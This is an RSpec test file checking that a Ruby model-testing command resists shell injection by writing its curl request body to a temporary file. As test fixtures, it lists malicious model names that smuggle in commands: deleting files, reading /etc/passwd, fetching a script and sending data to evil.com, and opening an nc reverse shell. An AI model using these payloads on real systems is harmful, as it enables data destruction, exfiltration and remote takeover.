# frozen_string_literal: true

require 'spec_helper'
require 'tempfile'
require 'json'

RSpec.describe 'Model Test Command Security Fix' do
  # Test the vulnerable method directly by extracting it
  let(:test_instance) do
    Class.new do
      attr_reader :execute_in_pod_calls

      def initialize
        @execute_in_pod_calls = []
      end

      # Override the execute_in_pod method to capture calls for testing
      def execute_in_pod(pod_name, command)
        @execute_in_pod_calls << { pod_name: pod_name, command: command }
        # Return mock JSON response
        '{"choices":[{"message":{"content":"test response"}}]}'
      end

      # Extract the fixed test_chat_completion method directly to test it
      def test_chat_completion(_name, model_name, pod, timeout)
        # Simulate the ProgressFormatter.with_spinner behavior
        pod_name = pod.dig('metadata', 'name')

        # Build the JSON payload
        payload = JSON.generate({
                                  model: model_name,
                                  messages: [{ role: 'user', content: 'hello' }],
                                  max_tokens: 10
                                })

        # Create temporary file to avoid command injection
        temp_file = nil
        begin
          temp_file = Tempfile.new(['model_test_payload', '.json'])
          temp_file.write(payload)
          temp_file.close

          # Build secure curl command using temp file
          # This eliminates shell injection vulnerability
          curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                         "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"

          # Execute the curl command inside the pod
          result = execute_in_pod(pod_name, curl_command)
        ensure
          # Clean up temporary file
          temp_file&.unlink
        end

        # Parse the response
        response = JSON.parse(result)

        if response['error']
          error_msg = response['error']['message'] || response['error']
          raise error_msg
        elsif !response['choices']
          raise "Unexpected response format: #{result.lines.first.strip}"
        end

        response
      rescue JSON::ParserError => e
        raise "Failed to parse response: #{e.message}"
      end
    end.new
  end

  let(:mock_pod) do
    {
      'metadata' => {
        'name' => 'test-model-pod'
      }
    }
  end

  describe '#test_chat_completion' do
    let(:model_name) { 'test-model' }
    let(:timeout) { 30 }

    context 'with normal model names' do
      it 'creates a secure curl command using temporary file' do
        test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, timeout)

        expect(test_instance.execute_in_pod_calls.length).to eq(1)

        captured_command = test_instance.execute_in_pod_calls.first[:command]
        expect(captured_command).to include('curl -s -X POST http://localhost:4000/v1/chat/completions')
        expect(captured_command).to include('-H \'Content-Type: application/json\'')
        expect(captured_command).to include('-d @')
        expect(captured_command).to include('--max-time 30')
        expect(captured_command).not_to include('echo')
        expect(captured_command).not_to include('|')
      end

      it 'cleans up temporary files' do
        # Track temp file creation
        temp_files_created = []
        allow(Tempfile).to receive(:new) do |_args|
          file = double('tempfile')
          allow(file).to receive(:write)
          allow(file).to receive(:close)
          allow(file).to receive(:path).and_return('/tmp/test_file')
          allow(file).to receive(:unlink)
          temp_files_created << file
          file
        end

        test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, timeout)

        # Verify temp file was created and cleaned up
        expect(temp_files_created.length).to eq(1)
        expect(temp_files_created.first).to have_received(:unlink)
      end
    end

    context 'with potentially malicious model names' do
      let(:malicious_payloads) do
        [
          "'; rm -rf /tmp/* ; echo '", # Command injection attempt
          "test'; cat /etc/passwd #", # File disclosure attempt
          'model"; wget evil.com/script.sh; #', # Download attempt
          "normal' && curl evil.com/steal?data=", # Data exfiltration
          "test'`id`'",                   # Command substitution
          'model$(whoami)',               # Command substitution
          "test\nrm -rf /",               # Newline injection
          "test\r\nHost: evil.com",       # HTTP header injection
          "test\x00/bin/sh",              # Null byte injection
          "normal' || nc evil.com 1337 -e /bin/sh #" # Reverse shell
        ]
      end

      it 'safely handles malicious model names without command injection' do
        malicious_payloads.each do |malicious_name|
          # Clear previous calls
          test_instance.execute_in_pod_calls.clear

          test_instance.send(:test_chat_completion, 'test-name', malicious_name, mock_pod, timeout)

          expect(test_instance.execute_in_pod_calls.length).to eq(1)
          captured_command = test_instance.execute_in_pod_calls.first[:command]

          # Verify the malicious content is safely contained in JSON and temp file
          expect(captured_command).not_to include(malicious_name)
          expect(captured_command).to match(%r{curl -s -X POST.*-d @/\S+.*--max-time \d+})

          # Verify no dangerous shell patterns are present in the command
          expect(captured_command).not_to include('echo')
          expect(captured_command).not_to include('rm -rf')
          expect(captured_command).not_to include('wget')
          expect(captured_command).not_to include('nc ')
          expect(captured_command).not_to include('/bin/sh')
          expect(captured_command).not_to include('&&')
          expect(captured_command).not_to include('||')
          expect(captured_command).not_to include(';')
          expect(captured_command).not_to include('`')
          expect(captured_command).not_to include('$(')
        end
      end

      it 'properly escapes timeout parameter' do
        # Test with string timeout that could be dangerous
        dangerous_timeout = '30; rm -rf /'

        test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, dangerous_timeout)

        captured_command = test_instance.execute_in_pod_calls.first[:command]

        # Verify timeout is properly converted to integer and doesn't contain injection
        expect(captured_command).to include('--max-time 30')
        expect(captured_command).not_to include('rm -rf')
        expect(captured_command).not_to include(';')
      end
    end

    context 'with edge case inputs' do
      it 'handles empty model name' do
        expect do
          test_instance.send(:test_chat_completion, 'test-name', '', mock_pod, timeout)
        end.not_to raise_error
      end

      it 'handles unicode characters in model name' do
        unicode_name = '测试模型🤖'

        expect do
          test_instance.send(:test_chat_completion, 'test-name', unicode_name, mock_pod, timeout)
        end.not_to raise_error
      end

      it 'handles very long model names' do
        long_name = 'a' * 1000

        expect do
          test_instance.send(:test_chat_completion, 'test-name', long_name, mock_pod, timeout)
        end.not_to raise_error
      end
    end

    context 'error handling' do
      it 'cleans up temp file even when execute_in_pod fails' do
        # Create a test instance with execute_in_pod that raises an error
        error_test_instance = Class.new do
          def execute_in_pod(_pod_name, _command)
            raise StandardError, 'Pod execution failed'
          end

          # Copy the secure test_chat_completion method
          def test_chat_completion(_name, model_name, pod, timeout)
            pod_name = pod.dig('metadata', 'name')
            payload = JSON.generate({
                                      model: model_name,
                                      messages: [{ role: 'user', content: 'hello' }],
                                      max_tokens: 10
                                    })

            temp_file = nil
            begin
              temp_file = Tempfile.new(['model_test_payload', '.json'])
              temp_file.write(payload)
              temp_file.close

              curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                             "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"

              result = execute_in_pod(pod_name, curl_command)
            ensure
              temp_file&.unlink
            end

            JSON.parse(result)
          rescue JSON::ParserError => e
            raise "Failed to parse response: #{e.message}"
          end
        end.new

        temp_file = double('tempfile')
        allow(temp_file).to receive(:write)
        allow(temp_file).to receive(:close)
        allow(temp_file).to receive(:path).and_return('/tmp/test_file')
        allow(temp_file).to receive(:unlink)
        allow(Tempfile).to receive(:new).and_return(temp_file)

        expect do
          error_test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, timeout)
        end.to raise_error(StandardError, 'Pod execution failed')

        # Verify cleanup happened despite the error
        expect(temp_file).to have_received(:unlink)
      end

      it 'cleans up temp file when JSON parsing fails' do
        # Create a test instance that returns invalid JSON
        json_error_test_instance = Class.new do
          def execute_in_pod(_pod_name, _command)
            'invalid json'
          end

          # Copy the secure test_chat_completion method
          def test_chat_completion(_name, model_name, pod, timeout)
            pod_name = pod.dig('metadata', 'name')
            payload = JSON.generate({
                                      model: model_name,
                                      messages: [{ role: 'user', content: 'hello' }],
                                      max_tokens: 10
                                    })

            temp_file = nil
            begin
              temp_file = Tempfile.new(['model_test_payload', '.json'])
              temp_file.write(payload)
              temp_file.close

              curl_command = 'curl -s -X POST http://localhost:4000/v1/chat/completions ' \
                             "-H 'Content-Type: application/json' -d @#{temp_file.path} --max-time #{timeout.to_i}"

              result = execute_in_pod(pod_name, curl_command)
            ensure
              temp_file&.unlink
            end

            JSON.parse(result)
          rescue JSON::ParserError => e
            raise "Failed to parse response: #{e.message}"
          end
        end.new

        temp_file = double('tempfile')
        allow(temp_file).to receive(:write)
        allow(temp_file).to receive(:close)
        allow(temp_file).to receive(:path).and_return('/tmp/test_file')
        allow(temp_file).to receive(:unlink)
        allow(Tempfile).to receive(:new).and_return(temp_file)

        expect do
          json_error_test_instance.send(:test_chat_completion, 'test-name', model_name, mock_pod, timeout)
        end.to raise_error(/Failed to parse response/)

        # Verify cleanup happened despite the error
        expect(temp_file).to have_received(:unlink)
      end
    end
  end

  describe 'integration with execute_in_pod' do
    it 'demonstrates that malicious content stays in temp file, not command' do
      # Test that even with the most dangerous model name, the command itself is safe
      malicious_model_name = "'; rm -rf /; echo '"

      test_instance.send(:test_chat_completion, 'test-name', malicious_model_name, mock_pod, 30)

      captured_command = test_instance.execute_in_pod_calls.first[:command]

      # The command should follow the secure pattern with temp file
      expect(captured_command).to match(
        %r{curl -s -X POST http://localhost:4000/v1/chat/completions -H 'Content-Type: application/json' -d @/\S+ --max-time 30}
      )

      # Verify the malicious content is nowhere in the command
      expect(captured_command).not_to include(malicious_model_name)
      expect(captured_command).not_to include('rm -rf')
      expect(captured_command).not_to include(';')
      expect(captured_command).not_to include('echo')
      expect(captured_command).not_to include('|')
    end
  end
end
